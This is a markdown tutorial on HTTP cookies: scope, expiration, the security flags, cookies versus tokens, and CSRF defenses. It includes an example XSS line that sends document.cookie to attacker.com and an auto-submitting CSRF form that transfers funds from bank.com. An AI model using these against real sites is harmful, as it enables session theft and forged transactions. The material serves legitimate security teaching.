# Cookies Deep Dive

## What Are Cookies?

### Definition

Cookies are **small pieces of data** (key-value pairs) that a server sends to a browser, which the browser stores and sends back with future requests to that server.

### Basic structure

```
name=value
```

**Example:**

```
sessionId=abc123xyz
```

### How they work

**1. Server sets cookie:**

```http
HTTP/1.1 200 OK
Set-Cookie: sessionId=abc123xyz

Welcome to our site!
```

**2. Browser stores cookie**

**3. Browser sends cookie on subsequent requests:**

```http
GET /profile HTTP/1.1
Host: example.com
Cookie: sessionId=abc123xyz
```

**4. Server reads cookie and responds:**

```http
HTTP/1.1 200 OK

Hello, authenticated user!
```

### Key characteristics

- **Stored by browser** (not server)
- **Automatically sent** with matching requests
- **Small size limit** (~4KB per cookie)
- **Domain-specific** (only sent to matching domain)

---

## Cookie Scopes

Cookies are restricted by **domain** and **path** to control where they're sent.

### Domain scope

#### Same domain (default)

```http
Set-Cookie: token=abc123
```

- Cookie set by `example.com`
- Sent to `example.com` only (exact match)

#### Include subdomains

```http
Set-Cookie: token=abc123; Domain=example.com
```

- Sent to:
  - ✅ `example.com`
  - ✅ `www.example.com`
  - ✅ `api.example.com`
  - ✅ `subdomain.example.com`

#### Cannot set for other domains

```http
Set-Cookie: token=abc123; Domain=google.com
```

- ❌ **Ignored** if trying to set from `example.com`
- Security protection (prevents cookie injection)

#### Domain examples

**Cookie from example.com:**

```http
Set-Cookie: session=xyz; Domain=example.com
```

**Sent to:**

- ✅ `https://example.com/page`
- ✅ `https://www.example.com/page`
- ✅ `https://api.example.com/data`

**NOT sent to:**

- ❌ `https://google.com`
- ❌ `https://example.org`
- ❌ `https://fakeexample.com`

### Path scope

#### Root path (default - sent everywhere)

```http
Set-Cookie: theme=dark; Path=/
```

- Sent to all paths on the domain
- `/`, `/products`, `/api/users`, etc.

#### Specific path

```http
Set-Cookie: adminToken=xyz; Path=/admin
```

- Sent only to paths starting with `/admin`
- ✅ `/admin`, `/admin/users`, `/admin/settings`
- ❌ `/`, `/products`, `/api`

#### Path examples

**Cookie with /api path:**

```http
Set-Cookie: apiKey=abc; Path=/api
```

**Sent to:**

- ✅ `/api/users`
- ✅ `/api/products/123`
- ✅ `/api/v2/data`

**NOT sent to:**

- ❌ `/`
- ❌ `/products`
- ❌ `/admin`

### Combining domain and path

```http
Set-Cookie: session=xyz; Domain=example.com; Path=/api
```

- Sent to: `api.example.com/api/users` ✅
- Sent to: `example.com/api/data` ✅
- NOT sent to: `example.com/products` ❌
- NOT sent to: `google.com/api` ❌

---

## Cookie Expiration

Cookies can be **session-based** (temporary) or **persistent** (long-lived).

### Session cookies (temporary)

**No expiration set:**

```http
Set-Cookie: tempSession=abc123
```

**Characteristics:**

- Exists **only during browser session**
- Deleted when browser is **closed**
- Not written to disk (kept in memory)

**Use cases:**

- Temporary shopping carts
- One-time authentication
- Session-based preferences

### Persistent cookies (long-lived)

**With Expires attribute:**

```http
Set-Cookie: rememberMe=true; Expires=Wed, 21 Jan 2026 07:28:00 GMT
```

- Deleted at specific **date/time**

**With Max-Age attribute (modern, preferred):**

```http
Set-Cookie: userId=123; Max-Age=2592000
```

- Deleted after **N seconds**
- `Max-Age=2592000` = 30 days

**Characteristics:**

- Survives **browser restarts**
- Written to **disk**
- Persists until expiration

**Use cases:**

- "Remember me" functionality
- Long-term user preferences
- Analytics tracking
- Authentication tokens

### Expiration examples

**1 hour:**

```http
Set-Cookie: session=abc; Max-Age=3600
```

**7 days:**

```http
Set-Cookie: token=xyz; Max-Age=604800
```

**1 year:**

```http
Set-Cookie: preferences=dark; Max-Age=31536000
```

**Delete cookie (expire immediately):**

```http
Set-Cookie: oldCookie=; Max-Age=0
Set-Cookie: oldCookie=; Expires=Thu, 01 Jan 1970 00:00:00 GMT
```

### Max-Age vs Expires

| Aspect            | Max-Age               | Expires                      |
| ----------------- | --------------------- | ---------------------------- |
| Format            | Seconds (integer)     | HTTP date string             |
| Relative/Absolute | Relative (from now)   | Absolute (specific datetime) |
| Preference        | ✅ Preferred (modern) | ⚠️ Legacy (still supported)  |
| Browser support   | All modern browsers   | All browsers                 |

**Both can be used together (Max-Age takes precedence):**

```http
Set-Cookie: session=abc; Max-Age=3600; Expires=Wed, 21 Jan 2025 08:00:00 GMT
```

---

## Security Flags

Modern cookies should **always** include security flags to prevent attacks.

### HttpOnly flag

**Prevents JavaScript access to cookies.**

```http
Set-Cookie: sessionId=abc123; HttpOnly
```

#### Without HttpOnly (❌ VULNERABLE)

```javascript
// JavaScript can read cookie
console.log(document.cookie); // "sessionId=abc123"

// XSS attack can steal it
fetch("https://attacker.com/steal?cookie=" + document.cookie);
```

#### With HttpOnly (✅ PROTECTED)

```javascript
// JavaScript CANNOT read cookie
console.log(document.cookie); // "" (empty, cookie hidden)

// XSS attack CANNOT steal it
fetch("https://attacker.com/steal?cookie=" + document.cookie); // sends nothing
```

#### How it works

- Cookie still **sent automatically** with requests
- Just **not accessible** via `document.cookie`
- Server can still read it in request headers

#### Use cases

- **Session tokens** (always use HttpOnly)
- **Authentication cookies** (always use HttpOnly)
- **Any sensitive data**

**Example:**

```http
Set-Cookie: session=abc123; HttpOnly; Path=/; Max-Age=3600
```

---

### Secure flag

**Cookies only sent over HTTPS.**

```http
Set-Cookie: sessionId=abc123; Secure
```

#### Without Secure (❌ VULNERABLE)

```
User → http://example.com (unencrypted)
Cookie: sessionId=abc123
         ↓
     Attacker intercepts (man-in-the-middle)
         ↓
     Cookie stolen!
```

#### With Secure (✅ PROTECTED)

```
User → https://example.com (encrypted TLS)
Cookie: sessionId=abc123
         ↓
     Encrypted, attacker cannot read
         ↓
     Cookie safe!
```

**Cookie NOT sent over HTTP:**

```
User → http://example.com
(cookie not included, even if domain matches)
```

#### Use cases

- **Always use on production** (HTTPS should be default)
- **Session cookies** (always use Secure)
- **Any sensitive data**

**Example:**

```http
Set-Cookie: session=abc123; Secure; HttpOnly; Path=/; Max-Age=3600
```

---

### SameSite flag

**Controls when cookies are sent in cross-site requests.**

Prevents **CSRF (Cross-Site Request Forgery)** attacks.

#### SameSite=Strict (most restrictive)

```http
Set-Cookie: session=abc123; SameSite=Strict
```

**Cookie ONLY sent in same-site requests:**

**Same-site request (✅ cookie sent):**

```
User on: https://example.com/page1
Clicks link to: https://example.com/page2
→ Cookie sent
```

**Cross-site request (❌ cookie NOT sent):**

```
User on: https://google.com
Clicks link to: https://example.com
→ Cookie NOT sent (even for GET requests)
```

**Use cases:**

- Banking/financial sites
- Admin panels
- High-security applications

**Trade-off:**

- Maximum security
- Breaks external links (users appear logged out when arriving from Google, etc.)

---

#### SameSite=Lax (balanced - default in modern browsers)

```http
Set-Cookie: session=abc123; SameSite=Lax
```

**Cookie sent for:**

- ✅ Same-site requests (all methods)
- ✅ Cross-site **top-level navigation** (GET only)

**Cookie NOT sent for:**

- ❌ Cross-site POST requests
- ❌ Cross-site AJAX/fetch
- ❌ Embedded resources (images, iframes)

**Examples:**

**Cross-site GET navigation (✅ cookie sent):**

```
User on: https://google.com
Clicks link to: https://example.com
→ Cookie sent (top-level navigation)
```

**Cross-site POST form (❌ cookie NOT sent):**

```html
<!-- On attacker.com -->
<form action="https://bank.com/transfer" method="POST">
  <input name="amount" value="1000" />
  <input name="to" value="attacker" />
</form>
<script>
  document.forms[0].submit();
</script>
```

→ Cookie NOT sent (CSRF prevented)

**Cross-site AJAX (❌ cookie NOT sent):**

```javascript
// From attacker.com
fetch("https://bank.com/api/transfer", {
  method: "POST",
  credentials: "include",
});
```

→ Cookie NOT sent

**Use cases:**

- **Default for most websites**
- Good balance of security and usability
- Works with external links (users stay logged in)

---

#### SameSite=None (least restrictive)

```http
Set-Cookie: tracking=xyz; SameSite=None; Secure
```

**Cookie sent in ALL contexts (same-site and cross-site).**

**IMPORTANT: Requires `Secure` flag** (must be HTTPS)

**Use cases:**

- Third-party cookies (ads, analytics, social widgets)
- Cross-domain authentication
- Embedded content that needs cookies

**Example:**

```html
<!-- On example.com -->
<iframe src="https://analytics.com/widget"></iframe>
```

**Analytics.com response:**

```http
Set-Cookie: userId=123; SameSite=None; Secure
```

→ Cookie sent even in cross-site iframe

**Security note:**

- Most vulnerable to CSRF
- Only use when cross-site access is **required**
- Always combine with other CSRF protections

---

### SameSite comparison

| Scenario              | Strict | Lax  | None |
| --------------------- | ------ | ---- | ---- |
| Same-site request     | ✅     | ✅   | ✅   |
| Cross-site link (GET) | ❌     | ✅   | ✅   |
| Cross-site form POST  | ❌     | ❌   | ✅   |
| Cross-site AJAX/fetch | ❌     | ❌   | ✅   |
| Embedded iframe/image | ❌     | ❌   | ✅   |
| CSRF protection       | 🔒🔒🔒 | 🔒🔒 | ❌   |

---

### Complete secure cookie example

```http
Set-Cookie: sessionId=abc123xyz;
  Path=/;
  Max-Age=3600;
  HttpOnly;
  Secure;
  SameSite=Strict
```

**Breakdown:**

- `sessionId=abc123xyz` - Name and value
- `Path=/` - Sent to all paths
- `Max-Age=3600` - Expires in 1 hour
- `HttpOnly` - JavaScript cannot access
- `Secure` - HTTPS only
- `SameSite=Strict` - Same-site only (max CSRF protection)

---

## Cookies vs Tokens

Two main approaches to authentication and session management.

### Cookies (traditional)

**How it works:**

```http
POST /login HTTP/1.1
Content-Type: application/json

{"username": "alice", "password": "secret"}

→

HTTP/1.1 200 OK
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict

Login successful
```

**Subsequent requests (automatic):**

```http
GET /profile HTTP/1.1
Cookie: sessionId=abc123
```

**Characteristics:**

- ✅ **Automatically sent** by browser (no JS needed)
- ✅ **Works with server-side rendering** (no JS required)
- ✅ **HttpOnly** prevents XSS theft
- ❌ **Vulnerable to CSRF** (requires additional protection)
- ❌ **Domain-restricted** (harder for cross-domain)
- ❌ **Not ideal for mobile apps** (no cookie jar)

---

### Tokens (modern - JWT, OAuth)

**How it works:**

```http
POST /login HTTP/1.1
Content-Type: application/json

{"username": "alice", "password": "secret"}

→

HTTP/1.1 200 OK
Content-Type: application/json

{"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```

**Client stores token (localStorage/memory):**

```javascript
localStorage.setItem("token", "eyJhbGci...");
```

**Subsequent requests (manual):**

```http
GET /profile HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Characteristics:**

- ✅ **No CSRF risk** (not sent automatically)
- ✅ **Cross-domain friendly** (can send anywhere)
- ✅ **Works great with mobile apps** and SPAs
- ✅ **Stateless** (no server-side session storage)
- ❌ **Vulnerable to XSS** if stored in localStorage
- ❌ **Requires JavaScript** (manual header management)
- ❌ **Larger request size** (token in every request)

---

### Cookies vs Tokens comparison

| Aspect                 | Cookies                          | Tokens                         |
| ---------------------- | -------------------------------- | ------------------------------ |
| **Storage**            | Browser (automatic)              | localStorage/memory (manual)   |
| **Transmission**       | Automatic (Cookie header)        | Manual (Authorization header)  |
| **CSRF risk**          | ❌ Yes (requires protection)     | ✅ No (not sent automatically) |
| **XSS risk**           | ✅ Protected with HttpOnly       | ❌ Vulnerable in localStorage  |
| **Cross-domain**       | ❌ Domain-restricted             | ✅ Can send anywhere           |
| **Mobile apps**        | ⚠️ Limited support               | ✅ Native support              |
| **Server-side render** | ✅ Works without JS              | ❌ Requires JS                 |
| **Stateless**          | ❌ Often requires server session | ✅ Can be stateless (JWT)      |

---

### Hybrid approach (best of both)

**Store token in HttpOnly cookie:**

```http
Set-Cookie: token=eyJhbGci...; HttpOnly; Secure; SameSite=Strict
```

**Benefits:**

- ✅ Protected from XSS (HttpOnly)
- ✅ Protected from CSRF (SameSite=Strict)
- ✅ Automatic transmission
- ✅ Works with server-side rendering

**This is often the best approach for web applications.**

---

## CSRF and Cookies

**CSRF (Cross-Site Request Forgery)** exploits the fact that browsers automatically send cookies.

### How CSRF works

**1. User logs into bank.com:**

```http
HTTP/1.1 200 OK
Set-Cookie: session=abc123; Path=/
```

**2. User visits attacker.com (while still logged in):**

**3. Attacker's page submits hidden form:**

```html
<!-- On attacker.com -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="10000" />
  <input type="hidden" name="to" value="attacker-account" />
</form>
<script>
  // Auto-submit when page loads
  document.forms[0].submit();
</script>
```

**4. Browser automatically sends cookie:**

```http
POST /transfer HTTP/1.1
Host: bank.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

amount=10000&to=attacker-account
```

**5. Bank server sees valid session cookie and executes transfer!** 💰➡️👿

---

### Why cookies are risky for CSRF

**Cookies are sent automatically:**

- ✅ Convenient (no manual work)
- ❌ Dangerous (sent even from malicious sites)

**Tokens in Authorization header are NOT sent automatically:**

```javascript
// Attacker CANNOT do this (cross-origin restriction)
fetch("https://bank.com/transfer", {
  method: "POST",
  headers: {
    Authorization: "Bearer " + stolenToken, // Can't get token!
  },
});
```

---

### CSRF defenses

#### 1. SameSite=Strict/Lax (best modern defense)

```http
Set-Cookie: session=abc123; SameSite=Strict
```

→ Cookie NOT sent from attacker.com to bank.com

#### 2. CSRF tokens (traditional)

```html
<!-- Bank.com form includes secret token -->
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="random-secret-xyz" />
  <input name="amount" />
  <input name="to" />
</form>
```

**Server validates token:**

```javascript
if (req.body.csrf_token !== req.session.csrf_token) {
  return res.status(403).send("CSRF token invalid");
}
```

**Attacker cannot get token (same-origin policy).**

#### 3. Double-submit cookie pattern

```http
Set-Cookie: csrfToken=xyz789
```

**JavaScript reads cookie and sends in header:**

```javascript
fetch("/transfer", {
  method: "POST",
  headers: {
    "X-CSRF-Token": document.cookie.match(/csrfToken=([^;]+)/)[1],
  },
});
```

**Attacker cannot read cookie from different origin.**

#### 4. Origin/Referer validation

```javascript
// Server checks request origin
if (req.headers.origin !== "https://bank.com") {
  return res.status(403).send("Invalid origin");
}
```

#### 5. Custom headers

```javascript
// Require custom header (CORS preflight will block cross-origin)
if (!req.headers["x-requested-with"]) {
  return res.status(403).send("Missing custom header");
}
```

---

### CSRF protection summary

**Modern approach (recommended):**

```http
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict
```

→ Automatically blocks CSRF

**Traditional approach (still valid):**

```http
Set-Cookie: session=abc; HttpOnly; Secure
```

→ Requires CSRF token in forms

**Token-based (no CSRF risk):**

```http
Authorization: Bearer <token>
```

→ Not sent automatically, CSRF impossible

---

## Best Practices

### Security checklist

- ✅ Always use `HttpOnly` for session cookies
- ✅ Always use `Secure` in production (HTTPS)
- ✅ Use `SameSite=Strict` or `Lax` for CSRF protection
- ✅ Set appropriate `Max-Age` (not too long)
- ✅ Use specific `Path` to limit scope
- ✅ Minimize cookie data (keep it small)
- ✅ Never store sensitive data in cookies (use session IDs only)

### Example secure session cookie

```http
Set-Cookie: sessionId=abc123xyz;
  Path=/;
  Max-Age=3600;
  HttpOnly;
  Secure;
  SameSite=Strict
```

### Example secure remember-me cookie

```http
Set-Cookie: rememberMe=token123;
  Path=/;
  Max-Age=2592000;
  HttpOnly;
  Secure;
  SameSite=Lax
```

### Example tracking cookie (third-party)

```http
Set-Cookie: tracking=xyz789;
  Path=/;
  Max-Age=31536000;
  Secure;
  SameSite=None
```

### What NOT to do

- ❌ Store passwords in cookies
- ❌ Store sensitive data in cookies (credit cards, SSN)
- ❌ Use cookies without `Secure` in production
- ❌ Use cookies without `HttpOnly` for auth
- ❌ Set `SameSite=None` unless absolutely necessary
- ❌ Set overly long expiration times
